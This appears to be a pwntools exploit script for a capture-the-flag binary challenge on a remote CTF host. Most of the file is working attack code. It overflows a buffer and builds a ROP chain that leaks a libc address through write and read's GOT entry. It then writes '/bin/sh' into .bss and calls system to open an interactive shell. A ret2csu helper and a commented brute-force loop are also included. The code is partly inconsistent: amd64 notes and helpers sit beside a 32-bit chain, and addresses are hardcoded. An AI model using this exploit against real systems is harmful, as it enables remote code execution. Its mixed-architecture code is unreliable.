#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host easypwn2.nu-tech.xyz --port 20002 ./pwn
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./pwn')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'easypwn2.nu-tech.xyz'
port = int(args.PORT or 20003)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      PIE enabled

libc = ELF('./libc-cos.so')
libc = exe.libc

# pop_csu = exe.sym['__libc_csu_init'] + 90
# call_csu = exe.sym['__libc_csu_init'] + 64 

def ret2csu(call_func, edi, rsi, rdx, rbx_a = 0, rbp_a = 1, r12_a = 0, r13_a = 0, r14_a = 0, r15_a = 0,pop_csu_on = 1):
    p_csu =''
    if pop_csu_on :
        p_csu = p64(pop_csu)
        p_csu += p64(0) # rbx
        p_csu += p64(0+1) # rbp
        p_csu += p64(call_func) # r12
        p_csu += p64(rdx) # r13
        p_csu += p64(rsi) # r14
        p_csu += p64(edi) # r15
    p_csu += p64(call_csu)
    p_csu += p64(0) #junk
    p_csu += p64(rbx_a) # rbx
    p_csu += p64(rbp_a) # rbp
    p_csu += p64(r12_a) # r12
    p_csu += p64(r13_a) # r13
    p_csu += p64(r14_a) # r14
    p_csu += p64(r15_a) # r15

    return p_csu

print hex(exe.sym['main'])
system = 0xf7dc5000
exit = 0xf7db76a0
pop_3 = 0x080485d9
pop_4=0x080485d8
bss = exe.bss()
io = start()

p = 'a'*28
# p += 'a'
# p += chr(i)
# p += p32(exe.plt['read'])
# p += p32(pop_3)
# p += p32(0)
# p += p32(bss)
# p += p32(8)
# p += p32(exe.sym['vuln'])

p += p32(exe.plt['write'])
p += p32(pop_3)
p += p32(1)
p += p32(exe.got['read'])
p += p32(4)
p += p32(exe.sym['vuln'])

# p += p32(exe.plt['write'])
# p += p32(pop_3)
# p += p32(0)
# p += p32(bss)
# p += p32(8)
# p += p32(system)
# # p += p32(exit)
# p += p32(bss)
# p += ret2csu(exe.got['write'],1,exe.got['read'],8)
io.sendafter('khan?\n',p)

data = u32(io.recv(4))
print hex(data)
libc.address = data - libc.sym['read']
print hex(libc.address)
sleep(0.1)

p = 'a'*28

p += p32(exe.plt['read'])
p += p32(pop_3)
p += p32(0)
p += p32(bss)
p += p32(8)
p += p32(exe.sym['vuln'])
io.send(p)

sleep(0.1)

io.send('/bin/sh\x00')

sleep(0.1)

p = 'a'*28

p += p32(libc.sym['system'])
p += p32(libc.sym['exit'])
p += p32(bss)
io.send(p)

io.interactive()
# io = start()
# for i in range(0x4006cf,0x400000+0x1000):
#     io = start()
#     # print('asdf')

#     # print(list(io.recv()))

#     # pop_rdi = exe.search(asm('pop rdi ; ret')).next()
#     p = 'a'*24
#     # p += chr(i)
#     p += p64(i)
#     p += p64(i)
#     p += p64(i)
#     # p += ret2csu(exe.got['write'],1,exe.got['read'],8)
#     io.sendafter('khan?\n',p)
#     # data = io.recvline()
#     # io.send(p)
#     data = io.recvall()
#     print(data)
#     if 'Ada yang' in data:
#         print('here')
#         print(i)
#         break
#         # print(i)

#     io.close()
# io.interactive()

# docker run -v $(pwd):/home -it nutech16.04
# gcc -no-pie -fno-stack-protector -o ./pwn pwn.c
# gcc -g -Wl,-z,relro,-z,now -no-pie -fno-stack-protector -o ./pwn pwn.c
